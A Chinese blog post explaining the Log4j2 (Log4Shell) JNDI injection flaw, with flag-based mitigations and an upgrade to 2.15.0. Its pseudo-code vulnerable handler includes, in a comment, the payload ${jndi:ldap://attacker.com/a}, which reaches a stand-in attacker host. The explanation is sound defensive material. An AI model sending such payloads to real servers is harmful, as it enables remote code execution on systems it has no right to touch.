

长话短说吧。

相信大家已经被 Log4j2 的重大漏洞刷屏了，估计有不少小伙伴此时此刻已经累趴下了。很不幸，我的小老弟小二的 Spring Boot 项目中恰好用的就是 Log4j2，版本特喵的还是 2.14.1，在这次漏洞波及的版本范围之内。

第一时间从网上得知这个漏洞的消息后，小二吓尿了。赶紧跑过来问老王怎么解决。

老王先是给小二提供了一些临时性的建议，比如说：

```
JVM 参数添加 -Dlog4j2.formatMsgNoLookups=true
log4j2.formatMsgNoLookups=True
FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true
```

并且老王也在时刻的关注着 Log4j2 的官网和 Spring Boot GitHub 仓库的最新消息。

Java 后端开发的小伙伴应该都知道，Log4j、SLF4J、Logback 这 3 个日志组件是一个爹——Ceki Gulcu，但 Log4j 2 却是例外，它是 Apache 基金会的产品。

所以这波超级高危漏洞的锅必须得由 Apache 来背。并且波及范围非常广，已知受影响的应用程序和组件有：

- Spring-boot-strater-log4j2
- Apache Solr
- Apache Flink
- Apache Druid

并且只要是在 Log4j 2.x <= 2.14.1 之间的版本，都将受到影响——注定被载入史册的一波 bug 啊。

目前，Log4j2 的官网已经发布了 Log4j2 2.15.0 正式版，来解决此次漏洞。

![](http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/images/shigu/log4j2-01.png)

那随着 Log4j2 2.15.0 正式版的发布，Spring Boot 的 GitHub 仓库提的这些关于 Log4j2 的 issue 都已经处于关闭状态了。

![](http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/images/shigu/log4j2-02.png)

看到这些消息后，老王紧张的情绪一下子就缓解了下来，就像吃了一颗定心丸，赶紧去通知小二不用再提心吊胆了，直接一行代码搞定。

```
<properties>
    <log4j2.version>2.15.0</log4j2.version>
</properties>
```

详情可参照 Spring Boot 官方这篇博客：

>https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot

Gradle 构建的项目也有解决方案。

![](http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/images/shigu/log4j2-03.png)

问题是解决了，不过老王没闲着。他从 Log4j2 官网公布的最新消息中琢磨出，本次远程代码执行漏洞正是由于组件存在 Java JNDI 注入漏洞：**当程序将用户输入的数据记录到日志时，攻击者通过构造特殊请求，来触发 Apache Log4j2 中的远程代码执行漏洞，从而利用此漏洞在目标服务器上执行任意代码**。

那肯定会有小伙伴在好奇 JNDI 是什么东东？来看一下维基百科的解释。

>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。

利用下面这段代码，攻击者可以通过JNDI来执行LDAP协议来注入一些非法的可执行代码。

```java
public class VulnerableLog4jExampleHandler implements HttpHandler {
    static Logger log = Logger.getLogger(log4jExample.class.getName());
    /**
     * A simple HTTP endpoint that reads the request's User Agent and logs it back.
     *
     * This is basically pseudo-code to explain the vulnerability, and not a full example.
     *
     * @param he HTTP Request Object
     */
    public void handle(HttpExchange he) throws IOException {
        String userAgent = he.getRequestHeader("user-agent");
// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
// The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
        log.info("Request User Agent:" + userAgent);
        String response = "<h1>Hello There, " + userAgent + "!</h1>";
        he.sendResponseHeaders(200, response.length());
        OutputStream os = he.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }
}
```

具体的攻击手段可以参考这里：

>https://github.com/apache/pulsar/issues/13232

下图是程序猿阿朗画的简单的攻击链路步骤图。

![](http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/images/shigu/log4j2-04.png)

感兴趣的小伙伴可以在本地复现一下，但**千万不要不当利用**哦！

![](http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/images/shigu/log4j2-05.png)

再次提醒大家一下，排查自己的项目是否引入了 Apache log4j-core Jar 包。

![](http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/images/shigu/log4j2-06.png)

如果存在依赖引入，且在受影响版本范围内，请升级到 Apache Log4j2  2.15.0 版本，目前已经 release。



